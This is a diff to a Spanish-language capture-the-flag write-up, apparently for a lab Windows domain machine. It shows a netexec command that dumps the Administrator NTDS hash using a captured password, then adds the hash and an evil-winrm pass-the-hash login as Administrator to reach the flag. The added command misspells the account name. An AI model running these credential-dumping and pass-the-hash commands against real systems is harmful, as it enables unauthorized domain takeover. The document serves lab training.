@@ -280,5 +280,9 @@ Como es miembro de Administrador y de Remote manager accedemos con [[EVIL_WINRM]
 Para poder acceder como usuario Administrator usaremos [[CRACKMAPEXEC-NETEXEC]] para obtener el hash del usuario:
 `netexec smb $IP -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!' --ntds vss --user Administrator`
 
+El hash es: `bb0edc15e49ceb4120c7bd7e6e65d75b`
+
 Y con el hash nos podremos conectar como Administrator con [[EVIL_WINRM]] 
-``
+`evil-winrm -i 10.10.11.70 -u "Admiinistrator" -H 'bb0edc15e49ceb4120c7bd7e6e65d75b'`
+
+Y nos encontramos la flag en el directorio Desktop
